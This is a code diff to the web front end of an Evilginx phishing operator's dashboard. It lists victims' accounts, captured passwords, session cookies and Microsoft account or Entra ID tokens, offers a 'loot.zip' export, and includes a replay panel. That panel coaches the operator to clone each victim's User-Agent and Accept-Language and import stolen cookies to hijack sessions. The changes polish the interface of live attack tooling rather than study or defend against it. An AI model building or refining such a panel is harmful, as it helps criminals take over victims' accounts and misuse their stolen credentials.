@@ -74,6 +74,10 @@
   }
   .btn:hover { border-color: var(--copper); color: var(--copper); }
   .btn.on { border-color: var(--copper); color: var(--copper); }
+  .live-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--faint); display: inline-block; flex: 0 0 auto; }
+  #auto.on { border-color: var(--olive); color: var(--olive); }
+  #auto.on .live-dot { background: var(--olive); box-shadow: 0 0 0 0 rgba(143,168,106,.55); animation: livepulse 1.6s ease-out infinite; }
+  @keyframes livepulse { 70% { box-shadow: 0 0 0 6px rgba(143,168,106,0); } }
   .btn.primary { background: var(--copper); border-color: var(--copper); color: #1c1914; font-weight: 600; }
   .btn.primary:hover { filter: brightness(1.08); color: #1c1914; }
   .btn[disabled] { opacity: .4; cursor: default; }
@@ -176,6 +180,10 @@
   .replay .warn { color: var(--bad); }
   .replay .hdr { font-family: var(--mono); font-size: 12px; word-break: break-all; background: var(--bg); border: 1px solid var(--line); padding: 6px 8px; margin-top: 3px; }
   .replay .hint { color: var(--faint); font-size: 11px; }
+  .fld { margin-top: 10px; }
+  .fld .k { color: var(--faint); font-size: 12px; margin-bottom: 3px; }
+  .fld .hdr { margin-top: 0; }
+  .when .abs { display: block; color: var(--faint); font-size: 11px; font-family: var(--mono); font-weight: 400; }
 
   #urlsview, #settingsview, #luresview, #dashview { padding: 12px 16px 40px; overflow: auto; flex: 1; }
   .dash-head { display: flex; align-items: flex-end; justify-content: space-between; gap: 16px; flex-wrap: wrap; margin-bottom: 18px; }
@@ -253,6 +261,7 @@
   }
   @media (prefers-reduced-motion: reduce) {
     #toast { transition: none; }
+    #auto.on .live-dot { animation: none; }
   }
 </style>
 </head>
@@ -266,7 +275,7 @@
       <input id="q" autocomplete="off" spellcheck="false">
     </div>
     <button class="btn" id="refresh" type="button"></button>
-    <button class="btn" id="auto" type="button"><span id="autolbl"></span></button>
+    <button class="btn" id="auto" type="button"><span class="live-dot"></span><span id="autolbl"></span></button>
     <a class="btn" id="loot" href="/export/loot.zip"></a>
     <a class="btn" id="csv" href="/export/sessions.csv"></a>
     <button class="btn" id="langbtn" type="button"></button>
@@ -333,7 +342,7 @@ const I18N = {
     th_user:"Account", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
     th_lastip:"IP", th_seen:"Seen", th_pass:"Password", th_captured:"Captured", th_expires:"Expires",
     th_target:"Target", th_lure_id:"Lure",
-    kind_msa:"MSA", kind_entra:"Entra", kind_none:"—", persist:"persist", used:"used",
+    kind_msa:"Microsoft account", kind_entra:"Entra ID", kind_none:"—", persist:"persist", used:"used",
     of:"of", victims_l:"accounts", sessions_l:"captures", empty_victims:"Nothing matches.",
     empty_sessions:"Nothing matches.", empty_insp:"Select a row. c copies cookies of the selection.",
     best_session:"Best capture", cookies_w:"cookies", useragent:"User-Agent", landing:"Landing",
@@ -376,7 +385,7 @@ const I18N = {
     tokens:"Tokens", password:"Password", copy_user:"Copy account",
     replay_title:"Replay (manual)", replay_match:"Match the victim",
     replay_import:"Import cookies on", replay_then:"Then open", replay_avoid:"Do not use",
-    replay_headers:"Headers to clone", replay_suggested:"suggested from country — not captured",
+    replay_headers:"Headers to clone", replay_al:"Accept-Language", replay_suggested:"suggested from country — not captured",
     replay_captured:"captured", replay_copy_ua:"Copy UA", replay_copy_al:"Copy Accept-Language",
     replay_copy_hdr:"Copy Cookie header", replay_copy_brief:"Copy replay brief",
     replay_brief_copied:"Replay brief copied", replay_hdr_copied:"Cookie header copied",
@@ -388,7 +397,7 @@ const I18N = {
     dash_day:"Today", dash_week:"This week", dash_month:"This month",
     vs_day:"vs yesterday", vs_week:"vs previous week", vs_month:"vs previous month",
     m_captures:"Captures", m_accounts:"Accounts", m_replay:"Replayable", m_passwords:"With password",
-    m_msa:"MSA", m_entra:"Entra", m_noise:"No login",
+    m_msa:"Microsoft account", m_entra:"Entra ID", m_noise:"No login",
     chart_day:"Captures by hour", chart_week:"Captures by day", chart_month:"Captures by day",
     chart_hint:"Copper = replayable. Grey = the rest.",
     kind_mix:"Token mix", by_phishlet:"By phishlet", no_period:"Nothing in this period.",
@@ -404,7 +413,7 @@ const I18N = {
     th_user:"Cuenta", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
     th_lastip:"IP", th_seen:"Visto", th_pass:"Password", th_captured:"Capturado", th_expires:"Caduca",
     th_target:"Servicio", th_lure_id:"Lure",
-    kind_msa:"MSA", kind_entra:"Entra", kind_none:"—", persist:"persist", used:"usada",
+    kind_msa:"cuenta Microsoft", kind_entra:"Entra ID", kind_none:"—", persist:"persist", used:"usada",
     of:"de", victims_l:"cuentas", sessions_l:"capturas", empty_victims:"Nada coincide.",
     empty_sessions:"Nada coincide.", empty_insp:"Selecciona una fila. c copia las cookies.",
     best_session:"Mejor captura", cookies_w:"cookies", useragent:"User-Agent", landing:"Landing",
@@ -447,7 +456,7 @@ const I18N = {
     tokens:"Tokens", password:"Password", copy_user:"Copiar cuenta",
     replay_title:"Replay (manual)", replay_match:"Igualar a la víctima",
     replay_import:"Importar cookies en", replay_then:"Luego abrir", replay_avoid:"No uses",
-    replay_headers:"Cabeceras a clonar", replay_suggested:"sugerido por el país — no capturado",
+    replay_headers:"Cabeceras a clonar", replay_al:"Accept-Language", replay_suggested:"sugerido por el país — no capturado",
     replay_captured:"capturado", replay_copy_ua:"Copiar UA", replay_copy_al:"Copiar Accept-Language",
     replay_copy_hdr:"Copiar cabecera Cookie", replay_copy_brief:"Copiar briefing de replay",
     replay_brief_copied:"Briefing copiado", replay_hdr_copied:"Cabecera Cookie copiada",
@@ -459,7 +468,7 @@ const I18N = {
     dash_day:"Hoy", dash_week:"Esta semana", dash_month:"Este mes",
     vs_day:"vs ayer", vs_week:"vs semana anterior", vs_month:"vs mes anterior",
     m_captures:"Capturas", m_accounts:"Cuentas", m_replay:"Rejugables", m_passwords:"Con password",
-    m_msa:"MSA", m_entra:"Entra", m_noise:"Sin login",
+    m_msa:"cuenta Microsoft", m_entra:"Entra ID", m_noise:"Sin login",
     chart_day:"Capturas por hora", chart_week:"Capturas por día", chart_month:"Capturas por día",
     chart_hint:"Cobre = rejugable. Gris = el resto.",
     kind_mix:"Mezcla de tokens", by_phishlet:"Por phishlet", no_period:"Nada en este periodo.",
@@ -504,6 +513,10 @@ function relTime(ts) {
   return t('ago')(Math.floor(d / 86400), 'd');
 }
 function absTime(ts) { if (!ts) return ''; return new Date(ts * 1000).toLocaleString(LANG === 'es' ? 'es-ES' : 'en-US'); }
+function whenCell(ts) {
+  if (!ts) return '<span class="mut">—</span>';
+  return `<span class="when" title="${esc(absTime(ts))}">${relTime(ts)}<span class="abs">${esc(absTime(ts))}</span></span>`;
+}
 function toast(msg) { const el = $('#toast'); el.textContent = msg; el.classList.add('show'); clearTimeout(el._t); el._t = setTimeout(() => el.classList.remove('show'), 2200); }
 
 function kindLabel(s) {
@@ -587,9 +600,15 @@ function replayBox(s) {
       ${s.cookies ? `<button class="btn" data-copyhdr="${s.id}">Cookie</button>` : ''}
       <button class="btn" data-copybrief="${s.id}">${t('replay_copy_brief')}</button>
     </div>
-    <div class="hdr">User-Agent<br>${esc(s.useragent || '—')}</div>
-    ${r.accept_lang ? `<div class="hdr mut">Accept-Language <span class="hint">(${t('replay_suggested')})</span><br>${esc(r.accept_lang)}</div>` : ''}
-    ${s.password ? `<div style="margin-top:8px">${t('th_pass')} ${passCell(s.password, 's:' + s.id)}</div>` : ''}
+    <div class="fld">
+      <div class="k">${t('useragent')} <span class="hint">(${t('replay_captured')})</span></div>
+      <div class="hdr">${esc(s.useragent || '—')}</div>
+    </div>
+    ${r.accept_lang ? `<div class="fld">
+      <div class="k">${t('replay_al')} <span class="hint">(${t('replay_suggested')})</span></div>
+      <div class="hdr">${esc(r.accept_lang)}</div>
+    </div>` : ''}
+    ${s.password ? `<div class="fld"><div class="k">${t('th_pass')}</div>${passCell(s.password, 's:' + s.id)}</div>` : ''}
     <div class="hint" style="margin-top:8px">${t('replay_vpn')}</div>
   </div>`;
 }
@@ -609,8 +628,8 @@ function ttlCell(s) {
   return '<span class="mut">—</span>';
 }
 function serviceOf(s) {
-  if (s.kind === 'entra') return 'Microsoft Entra';
-  if (s.kind === 'msa') return 'Microsoft MSA';
+  if (s.kind === 'entra') return 'Entra ID';
+  if (s.kind === 'msa') return 'Microsoft account';
   const blob = ((s.phishlet || '') + ' ' + (s.landing || '')).toLowerCase();
   if (/microsoft|o365|office365|office|entra|azure|msa\b|live\.com|microsoftonline/.test(blob)) return 'Microsoft';
   if (/google|gmail|gworkspace|workspace|accounts\.google/.test(blob)) return 'Google';
@@ -637,10 +656,10 @@ function lureTarget(sessions) {
   const phls = [...new Set(sessions.map(s => s.phishlet).filter(Boolean))];
   let name = [...new Set(sessions.map(serviceOf))][0] || phls[0] || t('unknown');
   if (kinds.has('entra') && kinds.has('msa')) name = 'Microsoft';
-  else if (kinds.has('entra')) name = 'Microsoft Entra';
-  else if (kinds.has('msa')) name = 'Microsoft MSA';
+  else if (kinds.has('entra')) name = 'Entra ID';
+  else if (kinds.has('msa')) name = 'Microsoft account';
   let detail = phls.join(', ');
-  if (kinds.has('entra') && kinds.has('msa')) detail = 'Entra + MSA' + (phls.length ? ' · ' + phls.join(', ') : '');
+  if (kinds.has('entra') && kinds.has('msa')) detail = 'Entra ID + Microsoft account' + (phls.length ? ' · ' + phls.join(', ') : '');
   return { name, detail };
 }
 
@@ -927,10 +946,8 @@ async function loadHealth() {
   try {
     const h = await (await fetch('/api/health')).json();
     window._health = h;
-    const up = h.evilginx_up ? `<span style="color:var(--olive)">${t('health_up')}</span>` : `<span style="color:var(--bad)">${t('health_down')}</span>`;
-    const last = h.last_capture ? t('last_capture') + ' ' + relTime(h.last_capture) : t('no_captures');
     const kb = (h.db_size_bytes / 1024).toFixed(0);
-    $('#foothealth').innerHTML = `${up} · ${last} · db ${kb} KB · v${h.version}`;
+    $('#foothealth').innerHTML = `db ${kb} KB · v${h.version}`;
   } catch (e) {}
 }
 
@@ -955,12 +972,12 @@ function renderVictims() {
     const st = victimStatus(v.username);
     const sel = state.sel && state.sel.type === 'victim' && state.sel.key === v.username.toLowerCase();
     return `<tr data-sel="victim:${esc(v.username.toLowerCase())}" class="${sel ? 'sel' : ''}">
-      <td class="u">${esc(v.username)}${st !== 'inbox' ? ` <span class="st ${st}">${t('st_' + st)}</span>` : ''}</td>
+      <td class="u">${esc(v.username)} <span class="st ${st}">${t('st_' + st)}</span></td>
       <td>${kindCell(v.best)}</td>
       <td>${passCell(v.password, 'v:' + v.username.toLowerCase())}</td>
       <td class="mut">${esc(fromLine(v.best))}</td>
       <td>${ttlCell(v.best)}</td>
-      <td class="mut" title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
+      <td>${whenCell(v.lastUpdate)}</td>
     </tr>`;
   }).join('') : `<tr><td colspan="6" class="empty">${state.inbox ? t('empty_inbox') : t('empty_victims')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
@@ -989,7 +1006,7 @@ function renderSessions() {
       <td>${passCell(s.password, 's:' + s.id)}</td>
       <td class="mut">${esc(fromLine(s))}</td>
       <td>${ttlCell(s)}</td>
-      <td class="mut" title="${absTime(s.update)}">${relTime(s.update)}</td>
+      <td>${whenCell(s.update)}</td>
     </tr>`;
   }).join('') : `<tr><td colspan="7" class="empty">${t('empty_sessions')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
@@ -1019,7 +1036,7 @@ function renderInspector() {
       <div class="meta-grid">
         <div><div class="k">${t('tokens')}</div><div class="v">${(b && b.tokens && b.tokens.length) ? b.tokens.map(esc).join(', ') : '—'}</div></div>
         <div><div class="k">${t('landing')}</div><div class="v">${esc(b && b.landing)}</div></div>
-        <div><div class="k">${t('th_lastip')}</div><div class="v">${esc(v.lastIP || '')}${ips.length > 1 ? ' · '+ips.size+' IPs' : ''}</div></div>
+        <div><div class="k">${t('th_lastip')}</div><div class="v">${esc(v.lastIP || '—')}${ips.length > 1 ? ' · ' + ips.length + ' IPs' : ''}</div></div>
       </div>
       ${v.sessions.length > 1 ? `<div class="k" style="margin-bottom:4px;color:var(--faint)">${t('attempts_h')} (${v.sessions.length})</div>
       <div class="attempts">${v.sessions.slice().sort((a,b)=>b.update-a.update).map(s => `
@@ -1027,7 +1044,7 @@ function renderInspector() {
           <span class="mut">#${s.id}</span>
           ${kindCell(s)}
           <span class="mut">${esc(fromLine(s))}</span>
-          <span class="mut">${relTime(s.update)}</span>
+          ${whenCell(s.update)}
           ${s.cookies ? `<button class="btn" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
         </div>`).join('')}</div>` : ''}
       <div class="cookies-list" id="ckbox" hidden></div>
